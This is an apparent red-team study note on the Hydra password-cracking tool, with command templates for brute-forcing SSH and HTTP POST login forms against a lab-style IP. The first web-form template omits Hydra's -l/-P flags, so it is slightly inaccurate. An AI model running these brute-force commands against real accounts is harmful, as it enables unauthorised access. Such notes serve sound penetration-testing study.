---
tags:
  - "#cybersecurity/red-team/password-attacks"
---

Hydra is a free and open-source [[Password Cracking]] tool. It can try numerous passwords till the correct password is found. It can be used to crack passwords for various network services, including [[Secure Shell (SSH)]], [[Telnet]], [[File Transfer Protocol (FTP)]], and [[Hypertext Transfer Protocol (HTTP)]].

## Hydra Commands
### SSH
```
hydra -l <username> -P <full path to pass> MACHINE_IP -t 4 ssh

hydra -l root -P passwords.txt 10.49.146.131 -t 4 ssh
```
### Post Web Form
```
sudo hydra <username> <wordlist> MACHINE_IP http-post-form "<path>:<login_credentials>:<invalid_response>"

hydra -l <username> -P <wordlist> 10.49.146.131 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
```

